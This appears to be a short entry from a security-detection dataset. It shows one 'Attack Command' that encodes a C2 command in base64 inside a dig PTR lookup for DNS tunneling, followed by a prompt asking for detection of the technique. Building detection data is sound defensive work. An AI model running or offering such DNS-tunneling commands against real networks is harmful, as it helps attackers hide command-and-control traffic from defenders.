...
# Using dig with PTR records for DNS tunneling C2.
...
## Attack Command
```
dig +short PTR $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)
```
...
## AI Training Prompt
Train AI to detect dig-based DNS tunneling with PTR records by analyzing query patterns, base64-encoded subdomains, and PTR record usage; suggest DNS inspection.
